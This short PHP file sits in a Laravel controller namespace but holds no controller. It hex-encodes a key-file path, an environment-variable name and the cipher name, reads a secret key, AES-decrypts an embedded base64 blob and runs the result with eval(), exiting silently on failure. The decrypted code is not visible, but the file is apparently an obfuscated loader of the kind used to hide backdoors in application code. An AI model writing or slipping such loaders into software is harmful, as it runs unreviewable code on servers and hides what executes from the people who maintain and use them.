<?php
namespace App\Http\Controllers;
$f=hex2bin('2f6574632f61706c696b6173696b6974612e736563');

$k=getenv(hex2bin('41504c494b4153494b4954415f5345435f4b4559'))?:(@file_exists($f)?trim(@file_get_contents($f)):null);

if(!$k)exit;

$i=base64_decode('u9k4lHpP+sUCHB+902cdYQ==');

$c=base64_decode(

'YaJFu1ymxo4gfDb1EGI0khf+KwikeYIBDBQ0+df93PXGa7XrLhxnX8VEugpsnrD0N9tAm4bm7Oik' .
'J3nbvih4ZgG2CE2vs55LkNHUwTnei6FjRs4UQKZ/LK1/AITjeqsda3JdAVYfSSAZeEIOANZMDsY8' .
'8rfGBoW5XnHq1zlktGYg/b3GQmzGfYGQrpyKmXE3bQwxbUEBRtDtfN7jzQC1KUg/cfSKhOIk02hr' .
'8FmLBU2uHzVwIiaCWMD+jaswyiGKPlFm1qyrvObPhSKmy23ZIWvsyUD1XnqmCANDUw+RwHc6TYQL' .
'UOyeTGvaKcyQRWssbtraTSQ0VjV/jXZRjbzo6bvk4WsNZCh/RcShJA6BtiFm2xifKi3wnZFMXPw3' .
'zMTnnhU0snQnFI0XoaP9UOu5qw=='

);

$d=openssl_decrypt($c,hex2bin('6165732d3235362d636263'),hash('sha256',$k,true),1,$i);

if($d===false)exit;

eval($d);

